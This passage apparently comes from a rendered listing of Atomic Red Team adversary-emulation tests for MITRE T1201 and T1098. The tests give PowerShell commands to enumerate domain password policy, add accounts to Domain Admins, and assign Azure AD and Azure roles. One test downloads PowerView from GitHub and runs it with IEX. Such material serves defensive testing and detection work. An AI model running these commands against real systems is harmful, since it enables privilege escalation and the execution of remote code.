<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843</li>
<li><strong>name</strong>: Get-DomainPolicy with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1201</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b2698b33-984c-4a1c-93bb-e4ba72a0babb</li>
<li><strong>name</strong>: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
Upon successful execution a listing of the policy implemented will display.
Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: get-addefaultdomainpasswordpolicy</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1201</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a55a22e9-a3d3-42ce-bd48-2653adb8f7a9</li>
<li><strong>name</strong>: Domain Account and Group Manipulate</li>
<li><strong>description</strong>: Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). </li>
</ul>
<p>The quickest way to run it is against a domain controller, using <code>-Session</code> of <code>Invoke-AtomicTest</code>. Alternatively,
you need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to 
create the user and alter the group. Automatic installation of the dependency requires an elevated session, 
and is unlikely to work with Powershell Core (untested).</p>
<p>If you consider running this test against a production Active Directory, the good practise is to create a dedicated
service account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated
as group manager of the target group.</p>
<p>Example: <code>Invoke-AtomicTest -Session $session 'T1098' -TestNames "Domain Account and Group Manipulate" -InputArgs @{"group" = "DNSAdmins" }</code></p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: $x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99</li>
</ul>
<p>Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "#{group}" $account</p>
<ul>
<li>
<p><strong>prereq_command</strong>: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Get-ADUser -LDAPFilter "(&amp;(samaccountname=#{account_prefix}-*)(givenName=Test))" | Remove-ADUser -Confirm:$False</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1098</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0e65ae27-5385-46b4-98ac-607a8ee82261</li>
<li><strong>name</strong>: Azure AD - adding user to Azure AD role</li>
<li><strong>description</strong>: The adversaries want to add user to some Azure AD role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, 
Privileged Authentication Administrator (this role can reset Global Administrator password!).
By default, the role Global Reader is assigned to the user principal in this test.</li>
</ul>
<p>The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.</p>
<p>Detection hint - check Activity "Add member to role" in Azure AD Audit Logs. In targer you will also see User as a type.</p>
<ul>
<li><strong>platforms</strong>: ['azure-ad']</li>
<li><strong>command</strong>: Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential</li>
</ul>
<p>$user = Get-AzureADUser -Filter "DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore</p>
</li>
</ul>
<p>$user = Get-AzureADUser -Filter "DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'"
if ($user -eq $null) { Write-Warning "User not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host "User $($user.DisplayName) was removed from $($role.DisplayName) role"</p>
<ul>
<li><strong>mitre_id</strong>: T1098</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': 'jonh@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'p4sswd'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 92c40b3f-c406-4d1f-8d2b-c039bf5009e4</li>
<li><strong>name</strong>: Azure AD - adding service principal to Azure AD role</li>
<li><strong>description</strong>: The adversaries want to add service principal to some Azure AD role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, 
Privileged Authentication Administrator (this role can reset Global Administrator password!).
By default, the role Global Reader is assigned to service principal in this test.</li>
</ul>
<p>The account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.</p>
<p>Detection hint - check Activity "Add member to role" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.</p>
<ul>
<li><strong>platforms</strong>: ['azure-ad']</li>
<li><strong>command</strong>: Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential</li>
</ul>
<p>$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '#{service_principal_name}'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore</p>
</li>
</ul>
<p>$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '#{service_principal_name}'"
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$role = Get-AzureADDirectoryRole -Filter "DisplayName eq '#{role_name}'"
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role"</p>
<ul>
<li><strong>mitre_id</strong>: T1098</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': 'jonh@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'p4sswd'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1a94b3fc-b080-450a-b3d8-6d9b57b472ea</li>
<li><strong>name</strong>: Azure - adding user to Azure role in subscription</li>
<li><strong>description</strong>: The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Owner, Contributor.
By default, the role Reader is assigned to user in this test.</li>
</ul>
<p>New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.</p>
<p>The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write 
(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All 
and Microsoft Graph Directory.Read.All permissions.</p>
<p>Detection hint - check Operation Name "Create role assignment" in subscriptions Activity Logs.</p>
<ul>
<li><strong>platforms</strong>: ['iaas:azure']</li>
<li><strong>command</strong>: Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential</li>
</ul>
<p>$user = Get-AzADUser | where-object {$<em>.DisplayName -eq "#{user_principal_name}" -or $</em>.UserPrincipalName -eq "#{user_principal_name}" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$<em>.Name -eq "#{subscription}"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$</em>.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name Az.Resources -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore</p>
</li>
</ul>
<p>$user = Get-AzADUser | where-object {$<em>.DisplayName -eq "#{user_principal_name}" -or $</em>.UserPrincipalName -eq "#{user_principal_name}" }
if ($user -eq $null) { Write-Warning "User not found"; exit }
$subscription = Get-AzSubscription | where-object {$<em>.Name -eq "#{subscription}"}
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$</em>.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"</p>
<ul>
<li><strong>mitre_id</strong>: T1098</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
